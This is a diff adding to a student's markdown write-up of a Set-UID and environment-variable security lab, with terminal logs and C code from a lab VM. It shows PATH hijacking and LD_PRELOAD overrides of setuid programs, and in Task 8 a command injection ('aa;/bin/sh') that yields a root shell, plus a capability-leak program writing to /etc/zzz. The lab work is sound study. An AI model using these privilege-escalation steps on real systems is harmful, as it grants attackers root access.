@@ -205,3 +205,211 @@ SSH_AUTH_SOCK=/run/user/1000/keyring/ssh
 XMODIFI....
 ````
 
+## step 2
+after i will change the ownership to root 
+
+
+```bash
+[06/15/23]seed@VM:~/.../Labsetup$ sudo chown root a.out 
+[06/15/23]seed@VM:~/.../Labsetup$  sudo chmod 4755 a.out 
+[06/15/23]seed@VM:~/.../Labsetup$ 
+
+
+```
+## step 3 
+```bash 
+[06/15/23]seed@VM:~/.../Labsetup$ export PATH="/bin:/usr/bin"
+[06/15/23]seed@VM:~/.../Labsetup$ printenv PATH
+/bin:/usr/bin
+[06/15/23]seed@VM:~/.../Labsetup$ export LD_LIBRARY_PATH="haithemLib"
+[06/15/23]seed@VM:~/.../Labsetup$ printenv LD_LIBRARY_PATH
+haithemLib
+[06/15/23]seed@VM:~/.../Labsetup$ export haithem_var="qjksdnsjkf"
+[06/15/23]seed@VM:~/.../Labsetup$ ./a.out | grep "haithem_var\|LD_LIBRARY_PATH\|PATH"
+haithem_var=qjksdnsjkf
+WINDOWPATH=2
+PATH=/bin:/usr/bin
+[06/15/23]seed@VM:~/.../Labsetup$ 
+```
+
+# Task 6
+
+```bash 
+[06/15/23]seed@VM:~/.../Labsetup$ gedit lsProgram.c
+```
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+int main() {
+	printf("My malicious code!!\n");
+	if (geteuid() == 0) {
+		printf("I have root privilege!\n");
+	}
+	return 0;
+}
+```
+```bash 
+[06/15/23]seed@VM:~/.../Labsetup$ gcc lsProgram.c 
+[06/15/23]seed@VM:~/.../Labsetup$ sudo chown root ./a.out
+[06/15/23]seed@VM:~/.../Labsetup$ sudo chmod 4755 ./a.out
+[06/15/23]seed@VM:~/.../Labsetup$ sudo ln -sf /bin/zsh /bin/sh
+[06/15/23]seed@VM:~/.../Labsetup$ export PATH=/home/seed:$PATH
+[06/15/23]seed@VM:~/.../Labsetup$ ./a.out
+My malicious code!!
+I have root privilege!
+[06/15/23]seed@VM:~/.../Labsetup$ 
+```
+
+
+# Task 7 
+```bash 
+[06/15/23]seed@VM:~/.../Labsetup$ gedit mylib.c
+```
+
+```c
+#include <stdio.h>
+void sleep (int s)
+{
+/*If this is invoked by a privileged program,you can do damages here!*/
+printf("I am not sleeping!\n");
+}
+```
+
+
+```bash 
+[06/15/23]seed@VM:~/.../Labsetup$ gcc -fPIC -g -c mylib.c
+[06/15/23]seed@VM:~/.../Labsetup$ gcc -fPIC -g -c mylib.c
+[06/15/23]seed@VM:~/.../Labsetup$ export LD_PRELOAD=./libmylib.so.1.0.1
+[06/15/23]seed@VM:~/.../Labsetup$ gcc -o myprog myprog.c
+[06/15/23]seed@VM:~/.../Labsetup$ ./myprog
+I am not sleeping!
+```
+
+
+```bash 
+[06/15/23]seed@VM:~/.../Labsetup$ sudo chmod u+s myprog
+[06/15/23]seed@VM:~/.../Labsetup$ ./myprog
+I am not sleeping!
+[06/15/23]seed@VM:~/.../Labsetup$ sudo su
+root@VM:/home/seed/Desktop/Env_var/Labsetup# export LD_PRELOAD=./libmylib.so.1.0.1 
+root@VM:/home/seed/Desktop/Env_var/Labsetup# ./myprog 
+root@VM:/home/seed/Desktop/Env_var/Labsetup# exit
+exit
+[06/15/23]seed@VM:~/.../Labsetup$ 
+[06/15/23]seed@VM:~/.../Labsetup$ ./myprog
+I am not sleeping!
+```
+
+```bash 
+[06/15/23]seed@VM:~/.../Labsetup$ sudo su
+root@VM:/home/seed/Desktop/Env_var/Labsetup# useradd -d /usr/user1 -m user1
+root@VM:/home/seed/Desktop/Env_var/Labsetup# chown user1 myprog
+root@VM:/home/seed/Desktop/Env_var/Labsetup# chgrp user1 myprog
+root@VM:/home/seed/Desktop/Env_var/Labsetup# exit
+exit
+[06/15/23]seed@VM:~/.../Labsetup$ export LD_PRELOAD=./libmylib.so.1.0.1
+[06/15/23]seed@VM:~/.../Labsetup$ ./myprog 
+I am not sleeping!
+[06/15/23]seed@VM:~/.../Labsetup$ 
+```
+
+# Task 8
+
+```c
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[])
+{
+        char *v[3];
+        char *command;
+
+        if(argc < 2){
+                printf("Please type a file name.\n");
+                return 1;
+        }
+
+        v[0] = "/bin/cat"; v[1]=argv[1]; v[2] = NULL;
+
+        command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
+        sprintf(command, "%s %s", v[0], v[1]);
+
+        system(command);
+        //execve(v[0], v, NULL);
+
+        return 0;
+}
+```
+
+```bash
+[06/15/23]seed@VM:~/.../Labsetup$ gedit task8.c
+[06/15/23]seed@VM:~/.../Labsetup$ gcc -o task8 task8.c
+[06/15/23]seed@VM:~/.../Labsetup$ sudo chown root task8
+[06/15/23]seed@VM:~/.../Labsetup$ sudo chmod 4755 task8
+[06/15/23]seed@VM:~/.../Labsetup$ sudo ln -sf /bin/zsh /bin/sh
+[06/15/23]seed@VM:~/.../Labsetup$ 
+[06/15/23]seed@VM:~/.../Labsetup$ ./task8  "aa;/bin/sh"
+/bin/cat: aa: No such file or directory
+# id
+uid=1000(seed) gid=1000(seed) euid=0(root) groups=1000(seed),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),136(docker)
+# 
+
+```
+
+# Task 9
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+void main()
+{
+        int fd;
+
+        /* Assuem that /etc/zzz is an important system file,
+         * and it is owned by root with permission 4755.
+         * Before running this program, you should creat
+         * the file /etc/zzz first */
+
+        fd = open("/etc/zzz", O_RDWR | O_APPEND);
+
+        if(fd ==-1){
+                printf("Cannot open /etc/zzz\n");
+                exit(0);
+        }
+
+        /* Simulate the tasks conducted by the program */
+        sleep(1);
+
+        /* After the task, the root privileges are no longer needed,
+           it's time to relinquish the root privileges permanently. */
+        setuid(getuid());       /* getuid() returns the real uid*/
+
+        if(fork()){ /* in the parent process */
+                close(fd);
+                exit(0);
+        } else{ /* in the child process */
+        /* Now, assume that the child process is compromised, malicious
+           atackers have injected the following statements into this process*/
+
+        write (fd, "Malicious Data\n", 15);
+        close(fd);
+        }
+}
+```
+
+```bash
+[06/15/23]seed@VM:~/.../Labsetup$ gcc -o task9 task9.c
+[06/15/23]seed@VM:~/.../Labsetup$ sudo chown root task9
+[06/15/23]seed@VM:~/.../Labsetup$ sudo chmod 4755 task9
+[06/15/23]seed@VM:~/.../Labsetup$ sudo touch /etc/zzz
+```
+
+
+ 
